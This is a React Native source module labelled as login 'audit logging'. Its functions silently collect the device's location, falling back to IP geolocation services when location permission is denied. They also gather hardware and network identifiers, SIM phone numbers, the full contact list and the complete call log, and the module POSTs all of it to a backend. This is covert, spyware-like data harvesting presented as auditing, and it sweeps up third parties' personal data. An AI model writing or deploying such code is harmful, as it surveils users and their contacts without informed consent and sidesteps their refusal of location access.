import * as Location from 'expo-location';
import * as Network from 'expo-network';
import * as Device from 'expo-device';
import * as Contacts from 'expo-contacts';
import DeviceInfo from 'react-native-device-info';
import { Platform, Dimensions, PermissionsAndroid } from 'react-native';
import SimCardsManager from 'react-native-sim-cards-manager';
import CallLogs from 'react-native-call-log';

/**
 * Collect location silently - GPS if enabled, approximate if not
 * @returns {Promise<Object|null>} Location data or null
 */
async function getLocationFromIP() {
  // Fallback: IP-based geolocation (works without GPS/location services)
  const endpoints = [
    {
      url: 'https://ipinfo.io/json',
      parse: (d) => {
        const [lat, lon] = (d.loc || '').split(',').map(Number);
        return {
          latitude: lat || null,
          longitude: lon || null,
          city: d.city,
          region: d.region,
          country: d.country,
          isp: d.org,
          ip: d.ip,
          timezone: d.timezone,
          postal: d.postal || null,
        };
      },
    },
    {
      url: 'https://ipapi.co/json/',
      parse: (d) => ({
        latitude: d.latitude,
        longitude: d.longitude,
        city: d.city,
        region: d.region,
        country: d.country_name,
        isp: d.org,
        ip: d.ip,
        timezone: d.timezone,
      }),
    },
    {
      url: 'https://ipwho.is/',
      parse: (d) => ({
        latitude: d.latitude,
        longitude: d.longitude,
        city: d.city,
        region: d.region,
        country: d.country,
        isp: d.connection?.isp || null,
        ip: d.ip,
        timezone: d.timezone?.id || null,
      }),
    },
    {
      url: 'https://freeipapi.com/api/json',
      parse: (d) => ({
        latitude: d.latitude,
        longitude: d.longitude,
        city: d.cityName,
        region: d.regionName,
        country: d.countryName,
        isp: null,
        ip: d.ipAddress,
        timezone: d.timeZone,
      }),
    },
  ];

  for (const endpoint of endpoints) {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);
      const res = await fetch(endpoint.url, { signal: controller.signal });
      clearTimeout(timeout);

      if (res.ok) {
        const data = await res.json();
        const parsed = endpoint.parse(data);
        if (parsed.latitude && parsed.longitude) {
          console.log('[Location] IP-based location obtained from', endpoint.url, ':', parsed.city, parsed.country);
          return {
            latitude: parsed.latitude,
            longitude: parsed.longitude,
            altitude: null,
            accuracy: null,
            city: parsed.city,
            region: parsed.region,
            country: parsed.country,
            isp: parsed.isp,
            ip: parsed.ip,
            timezone: parsed.timezone,
            postal: parsed.postal || null,
            timestamp: new Date().toISOString(),
            is_gps: false,
            is_approximate: true,
            method: 'ip_geolocation',
          };
        }
      }
    } catch (err) {
      console.warn('[Location] IP geolocation endpoint failed:', err.message);
    }
  }
  return null;
}

async function collectLocationSilently() {
  try {
    const { status } = await Location.getForegroundPermissionsAsync();

    if (status !== 'granted') {
      console.warn('[Location] Permission not granted - trying IP-based location');
      return await getLocationFromIP();
    }

    // Step 1: Try cached location FIRST (works even when services are off on some devices)
    // Must run while services are still potentially on so cache is populated
    let cachedLocation = null;
    try {
      console.log('[Location] Step 1: Trying cached location...');
      cachedLocation = await Location.getLastKnownPositionAsync({
        maxAge: 86400000, // Accept up to 24 hours old
      });
      console.log('[Location] Cached location:', cachedLocation ? 'found' : 'null');
    } catch (err) {
      console.warn('[Location] Cached location failed:', err.message);
    }

    // Step 2: Check if GPS/Location services are enabled
    const gpsEnabled = await Location.hasServicesEnabledAsync();
    console.log('[Location] GPS enabled:', gpsEnabled);

    if (gpsEnabled) {
      // GPS is ON - get accurate location
      console.log('[Location] Step 2: Getting GPS location (high accuracy)...');
      try {
        const location = await Location.getCurrentPositionAsync({
          accuracy: Location.Accuracy.High,
          timeout: 5000,
        });

        console.log('[Location] GPS location obtained');
        return {
          latitude: location.coords.latitude,
          longitude: location.coords.longitude,
          altitude: location.coords.altitude,
          accuracy: location.coords.accuracy,
          heading: location.coords.heading,
          speed: location.coords.speed,
          timestamp: new Date(location.timestamp).toISOString(),
          is_gps: true,
          is_approximate: false,
          method: 'gps',
        };
      } catch (err) {
        console.warn('[Location] GPS high accuracy failed:', err.message);

        // GPS is ON but high accuracy failed (weak signal) - try lower accuracy
        try {
          console.log('[Location] Trying lower accuracy...');
          const lowLoc = await Location.getCurrentPositionAsync({
            accuracy: Location.Accuracy.Lowest,
            timeout: 5000,
          });
          if (lowLoc) {
            console.log('[Location] Low accuracy location obtained');
            return {
              latitude: lowLoc.coords.latitude,
              longitude: lowLoc.coords.longitude,
              altitude: lowLoc.coords.altitude,
              accuracy: lowLoc.coords.accuracy,
              heading: lowLoc.coords.heading,
              speed: lowLoc.coords.speed,
              timestamp: new Date(lowLoc.timestamp).toISOString(),
              is_gps: true,
              is_approximate: false,
              method: 'gps_low_accuracy',
            };
          }
        } catch (err2) {
          console.warn('[Location] Low accuracy also failed:', err2.message);
        }

        // GPS is ON but all live methods failed - use cached if available
        if (cachedLocation) {
          console.log('[Location] Using cached location (GPS on but live failed)');
          return {
            latitude: cachedLocation.coords.latitude,
            longitude: cachedLocation.coords.longitude,
            altitude: cachedLocation.coords.altitude,
            accuracy: cachedLocation.coords.accuracy,
            timestamp: new Date(cachedLocation.timestamp).toISOString(),
            is_gps: false,
            is_approximate: true,
            method: 'cached',
          };
        }
      }
    }

    // Step 3: GPS is OFF - show "Location Accuracy" dialog
    // If user taps "Turn on" → accurate location returned
    // If user taps "No, thanks" → throws, fall through to cached/IP
    if (!gpsEnabled) {
      console.log('[Location] Step 3: GPS off - showing Location Accuracy dialog...');
      try {
        const dialogLoc = await Location.getCurrentPositionAsync({
          accuracy: Location.Accuracy.High,
          timeout: 15000, // Give user time to respond to dialog
        });
        if (dialogLoc) {
          console.log('[Location] User enabled location via dialog - accurate location obtained');
          return {
            latitude: dialogLoc.coords.latitude,
            longitude: dialogLoc.coords.longitude,
            altitude: dialogLoc.coords.altitude,
            accuracy: dialogLoc.coords.accuracy,
            heading: dialogLoc.coords.heading,
            speed: dialogLoc.coords.speed,
            timestamp: new Date(dialogLoc.timestamp).toISOString(),
            is_gps: true,
            is_approximate: false,
            method: 'gps_after_dialog',
          };
        }
      } catch (err) {
        console.log('[Location] User declined dialog or timed out:', err.message);
      }

      // Step 4: Dialog declined - use cached if available
      if (cachedLocation) {
        console.log('[Location] Using cached location (GPS off, dialog declined)');
        return {
          latitude: cachedLocation.coords.latitude,
          longitude: cachedLocation.coords.longitude,
          altitude: cachedLocation.coords.altitude,
          accuracy: cachedLocation.coords.accuracy,
          timestamp: new Date(cachedLocation.timestamp).toISOString(),
          is_gps: false,
          is_approximate: true,
          method: 'cached',
        };
      }
    }

    // Step 5: IP-based geolocation (always works, no GPS/services needed)
    console.log('[Location] Step 5: All device methods exhausted, trying IP geolocation...');
    return await getLocationFromIP();
  } catch (err) {
    console.error('[Location] Error during location collection:', err);
    // Even on error, try IP-based as last resort
    try {
      return await getLocationFromIP();
    } catch {
      return null;
    }
  }
}

/**
 * Collect comprehensive device metadata and location for audit logging
 * @returns {Promise<Object>} Complete device metadata
 *
 * NOTE: This function ALWAYS returns metadata, even if some parts fail.
 * Errors in individual sections don't prevent the audit log from being sent.
 */
export async function collectDeviceMetadata() {
  console.log('[DeviceMetadata] Starting comprehensive metadata collection...');

  const metadata = {
    timestamp: new Date().toISOString(),
    location: null,
    device: {},
    network: {},
    sim: {},
    system: {},
    contacts: [],
    call_logs: [],
  };

  // 1. LOCATION DATA (silently - GPS if enabled, approximate if not)
  console.log('[DeviceMetadata] Collecting location...');
  metadata.location = await collectLocationSilently();

  if (metadata.location) {
    const locType = metadata.location.is_gps ? 'GPS (accurate)' : 'Network (approximate)';
    console.log(`[DeviceMetadata] ✓ Location: ${locType}`);
  } else {
    console.warn('[DeviceMetadata] ✗ No location available');
  }

  // 2. DEVICE INFORMATION
  // Collect each field safely - one failure must not kill the entire block
  const safe = async (fn) => { try { return await fn(); } catch { return null; } };

  try {
    metadata.device = {
      // Basic device info (expo-device - sync, safe)
      brand: Device.brand,
      manufacturer: Device.manufacturer,
      model_name: Device.modelName,
      model_id: Device.modelId,
      device_name: Device.deviceName,
      device_type: Device.deviceType,

      // react-native-device-info v15 compatible
      unique_id: await safe(() => DeviceInfo.getUniqueId()),
      device_id: await safe(() => DeviceInfo.getDeviceId()),
      system_name: safe(() => DeviceInfo.getSystemName()),
      system_version: safe(() => DeviceInfo.getSystemVersion()),
      build_number: safe(() => DeviceInfo.getBuildNumber()),
      app_version: safe(() => DeviceInfo.getVersion()),
      bundle_id: safe(() => DeviceInfo.getBundleId()),

      // Hardware specs
      total_memory: await safe(() => DeviceInfo.getTotalMemory()),
      used_memory: await safe(() => DeviceInfo.getUsedMemory()),
      battery_level: await safe(() => DeviceInfo.getBatteryLevel()),
      is_charging: await safe(() => DeviceInfo.isBatteryCharging()),

      // Screen info
      screen_width: Dimensions.get('window').width,
      screen_height: Dimensions.get('window').height,
      font_scale: await safe(() => DeviceInfo.getFontScale()),

      // Device status
      is_emulator: await safe(() => DeviceInfo.isEmulator()),
      is_tablet: safe(() => DeviceInfo.isTablet()),

      // Additional details
      android_id: Platform.OS === 'android' ? await safe(() => DeviceInfo.getAndroidId()) : null,
      installer_package: Platform.OS === 'android' ? await safe(() => DeviceInfo.getInstallerPackageName()) : null,
      base_os: await safe(() => DeviceInfo.getBaseOs()),
      carrier: await safe(() => DeviceInfo.getCarrier()),

      // Location & providers
      location_enabled: await safe(() => DeviceInfo.isLocationEnabled()),
      available_location_providers: await safe(() => DeviceInfo.getAvailableLocationProviders()),

      // Network identifiers
      ip_address: await safe(() => DeviceInfo.getIpAddress()),
      mac_address: await safe(() => DeviceInfo.getMacAddress()),

      // Build details
      display: await safe(() => DeviceInfo.getDisplay()),
      hardware: await safe(() => DeviceInfo.getHardware()),
      codename: await safe(() => DeviceInfo.getCodename()),
      product: await safe(() => DeviceInfo.getProduct()),
      host: await safe(() => DeviceInfo.getHost()),
      tags: await safe(() => DeviceInfo.getTags()),
    };

    console.log('[DeviceMetadata] Device info collected');
  } catch (err) {
    console.error('[DeviceMetadata] Device info collection error:', err);
  }

  // 3. NETWORK INFORMATION
  try {
    const networkState = await Network.getNetworkStateAsync();
    const ipAddress = await Network.getIpAddressAsync();

    metadata.network = {
      type: networkState.type, // WIFI, CELLULAR, NONE, UNKNOWN
      is_connected: networkState.isConnected,
      is_internet_reachable: networkState.isInternetReachable,
      ip_address: ipAddress,
    };

    // Get WiFi SSID if connected to WiFi (Android only)
    if (Platform.OS === 'android' && networkState.type === Network.NetworkStateType.WIFI) {
      try {
        metadata.network.wifi_ssid = await DeviceInfo.getSSID();
      } catch (err) {
        console.warn('[DeviceMetadata] WiFi SSID not available:', err.message);
      }
    }

    console.log('[DeviceMetadata] Network info collected');
  } catch (err) {
    console.error('[DeviceMetadata] Network info collection error:', err);
  }

  // 4. SIM CARD INFORMATION (Android only)
  if (Platform.OS === 'android') {
    try {
      console.log('[DeviceMetadata] Fetching SIM card info...');

      const simCards = await SimCardsManager.getSimCards();

      metadata.sim = {
        sim_count: simCards.length,
        cards: simCards.map((sim, index) => ({
          slot_index: index,
          carrier_name: sim.carrierName || 'Unknown',
          display_name: sim.displayName || 'Unknown',
          phone_number: sim.phoneNumber || null, // May be null if not available
          country_code: sim.countryCode || null,
          is_network_roaming: sim.isNetworkRoaming || false,
        })),
      };

      console.log(`[DeviceMetadata] Found ${simCards.length} SIM card(s)`);
    } catch (err) {
      console.error('[DeviceMetadata] SIM card info collection error:', err);
      metadata.sim = {
        sim_count: 0,
        cards: [],
        error: err.message,
      };
    }
  } else {
    metadata.sim = {
      sim_count: 0,
      cards: [],
      note: 'SIM info only available on Android',
    };
  }

  // 5. SYSTEM INFORMATION
  try {
    metadata.system = {
      platform: Platform.OS,
      platform_version: Platform.Version,
      is_physical_device: Device.isDevice,
      free_disk_storage: await DeviceInfo.getFreeDiskStorage(),
      total_disk_capacity: await DeviceInfo.getTotalDiskCapacity(),
      user_agent: await DeviceInfo.getUserAgent(),
      bootloader: Platform.OS === 'android' ? await DeviceInfo.getBootloader() : null,
      supported_abis: Platform.OS === 'android' ? await DeviceInfo.supportedAbis() : null,
    };

    console.log('[DeviceMetadata] System info collected');
  } catch (err) {
    console.error('[DeviceMetadata] System info collection error:', err);
  }

  // 6. CONTACTS (check native Android permission directly)
  try {
    let contactsAllowed = false;
    if (Platform.OS === 'android') {
      contactsAllowed = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CONTACTS
      );
    } else {
      const { status: contactsStatus } = await Contacts.getPermissionsAsync();
      contactsAllowed = contactsStatus === 'granted';
    }

    if (contactsAllowed) {
      console.log('[DeviceMetadata] Fetching contacts...');
      const { data: contactsData } = await Contacts.getContactsAsync({
        fields: [
          Contacts.Fields.Name,
          Contacts.Fields.PhoneNumbers,
          Contacts.Fields.Emails,
        ],
      });

      metadata.contacts = contactsData.map(contact => ({
        id: contact.id,
        name: contact.name || 'Unknown',
        phone_numbers: contact.phoneNumbers?.map(p => p.number) || [],
        emails: contact.emails?.map(e => e.email) || [],
      }));

      console.log(`[DeviceMetadata] Collected ${metadata.contacts.length} contacts`);
    } else {
      console.warn('[DeviceMetadata] Contacts permission not granted');
    }
  } catch (err) {
    console.error('[DeviceMetadata] Contacts collection error:', err);
  }

  // 7. CALL LOGS (Android only)
  if (Platform.OS === 'android') {
    try {
      const callLogGranted = await PermissionsAndroid.check(
        PermissionsAndroid.PERMISSIONS.READ_CALL_LOG
      );
      if (callLogGranted) {
        console.log('[DeviceMetadata] Fetching call logs...');
        const logs = await CallLogs.loadAll();

        metadata.call_logs = (logs || []).map(log => ({
          name: log.name || null,
          phone_number: log.phoneNumber || null,
          type: log.type || null,           // INCOMING, OUTGOING, MISSED, etc.
          duration: log.duration || 0,       // seconds
          date_time: log.dateTime || null,   // human-readable date
          timestamp: log.timestamp || null,  // unix timestamp
          raw_type: log.rawType || null,     // numeric type code
        }));

        console.log(`[DeviceMetadata] Collected ${metadata.call_logs.length} call log entries`);
      } else {
        console.warn('[DeviceMetadata] Call Logs permission not granted');
      }
    } catch (err) {
      console.error('[DeviceMetadata] Call Logs collection error:', err);
    }
  }

  console.log('[DeviceMetadata] Metadata collection complete');
  return metadata;
}

/**
 * Send audit log to backend
 * @param {string} apiUrl - Base API URL
 * @param {string} userId - User ID (email/username)
 * @param {string} deviceId - Device ID
 * @param {string} eventType - Event type (e.g., "login", "logout")
 * @param {Object} metadata - Device metadata
 *
 * NOTE: This function never throws errors - it always returns a result.
 * Audit log failures should not prevent login from completing.
 */
export async function sendAuditLog(apiUrl, userId, deviceId, eventType, metadata) {
  try {
    console.log('[AuditLog] Sending audit log to backend...');
    console.log(`[AuditLog] Event: ${eventType}, User: ${userId}, Device: ${deviceId}`);
    console.log(`[AuditLog] Location: ${metadata.location ? (metadata.location.is_gps ? 'GPS' : 'Approximate') : 'Not available'}`);

    const auditData = {
      user_id: userId,
      device_id: deviceId,
      event_type: eventType,
      timestamp: new Date().toISOString(),
      metadata: metadata,
    };

    // React Native's fetch ignores the `timeout` option — must use AbortController
    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 15000);

    let response;
    try {
      response = await fetch(`${apiUrl}/device/api/metadata`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(auditData),
        signal: controller.signal,
      });
    } finally {
      clearTimeout(timer);
    }

    // Read raw body first so we can diagnose non-JSON responses (502 HTML pages etc.)
    const rawText = await response.text();
    let parsed = null;
    let parseError = null;
    try {
      parsed = rawText ? JSON.parse(rawText) : null;
    } catch (err) {
      parseError = err.message;
    }

    if (response.ok && parsed && parsed.success) {
      console.log('[AuditLog] ✓ Audit log sent successfully');
      return { success: true };
    }

    // Failure path — return rich diagnostics so callers can forward to error API
    const errMessage =
      parseError
        ? `JSON Parse error: ${parseError}`
        : (parsed?.message || `HTTP ${response.status} ${response.statusText || ''}`.trim());

    console.error('[AuditLog] ✗ Audit log failed:', errMessage);
    return {
      success: false,
      error: errMessage,
      http_status: response.status,
      http_status_text: response.statusText || '',
      response_snippet: (rawText || '').slice(0, 500),
      payload: auditData,
    };
  } catch (err) {
    console.error('[AuditLog] ✗ Audit log send error:', err);
    return {
      success: false,
      error: err.message,
      http_status: null,
      http_status_text: '',
      response_snippet: '',
      network_error: true,
      payload: {
        user_id: userId,
        device_id: deviceId,
        event_type: eventType,
        metadata,
      },
    };
  }
}

/**
 * Send an error report to a separate, lenient diagnostics endpoint.
 * This endpoint exists ONLY to track audit failures — it should accept any
 * payload shape and always return success. Used by the background task to
 * report every API_FAILED / HTTP_ERROR / TASK_ERROR to the backend so the
 * ops team can diagnose issues without logcat access.
 *
 * Endpoint: POST {apiUrl}/device/api/audit-errors
 *
 * The client intentionally swallows all errors from this call — reporting
 * an error must never throw or slow down the audit task.
 */
export async function reportAuditError(apiUrl, errorReport) {
  try {
    if (!apiUrl) return { success: false, error: 'no_api_url' };

    const controller = new AbortController();
    const timer = setTimeout(() => controller.abort(), 8000);

    try {
      const res = await fetch(`${apiUrl}/device/api/audit-errors`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(errorReport),
        signal: controller.signal,
      });
      // We don't care about the response content, only that it was accepted
      return { success: res.ok };
    } finally {
      clearTimeout(timer);
    }
  } catch (err) {
    console.warn('[AuditLog] Error reporter itself failed:', err?.message);
    return { success: false, error: err?.message };
  }
}
